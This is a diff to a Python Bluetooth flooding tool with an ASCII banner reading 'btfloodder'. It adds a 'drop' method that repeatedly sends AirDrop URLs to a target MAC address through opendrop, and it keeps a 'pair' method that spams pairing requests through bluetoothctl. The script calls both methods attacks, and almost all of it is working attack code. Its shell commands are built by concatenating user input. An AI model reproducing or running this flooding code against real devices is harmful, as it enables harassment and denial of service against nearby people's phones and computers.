@@ -19,6 +19,9 @@ except: cmd = ""
 if (cmd == "on"):
     print("hci0 up")
     hwus = run_cmd("hciconfig hci0 up")
+elif (cmd == "dropscan"):
+        print("needs openair drop sudo pip install opendrop")
+        print(run_cmd_out("opendrop find"))
 elif (cmd == "off"):
     print("hci0 down")
     hwus = run_cmd("hciconfig hci0 down")
@@ -61,7 +64,11 @@ else:
     elif (method == "pair"):
         def loopback():
             packetsent = 0
-            while packetsent != threadnum:
+            while int(packetsent) <= int(int(int(threadnum) - 1)):
+                os.system("clear")
+                print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
+                print("sent pair packet to " + macadd)
+                print("sent " + str(packetsent) + " packets out of " + threadnum)
                 run_cmd("bluetoothctl power on") 
                 run_cmd("bluetoothctl discoverable on") 
                 run_cmd("bluetoothctl pairable on") 
@@ -70,11 +77,19 @@ else:
                 run_cmd("timeout 1s bluetoothctl scan on")  
                 run_cmd("timeout 2s bluetoothctl pair " + macadd) 
                 packetsent += 1
-                os.system("clear")
-                print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
-                print("sent pair packet to " + macadd)
-                print("sent " + str(packetsent) + " packets out of " + threadnum)
         print("running " + method + " attack on " + macadd)
         threading.Thread(target = loopback).start()
+    elif (method == "drop"):
+        def loopbackdrop():
+            packetsent = 0
+            while int(packetsent) <= int(int(int(threadnum) - 1)):
+                os.system("clear")
+                print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
+                print("sent airdrop packet to " + macadd)
+                print("sent " + str(packetsent) + " packets out of " + threadnum)
+                run_cmd("opendrop send -r " + macadd + " -f https://bing.com --url")
+                packetsent += 1
+        print("running " + method + " attack on " + macadd)
+        threading.Thread(target = loopbackdrop).start()
     else:
         print("u fucked up the cmd") 
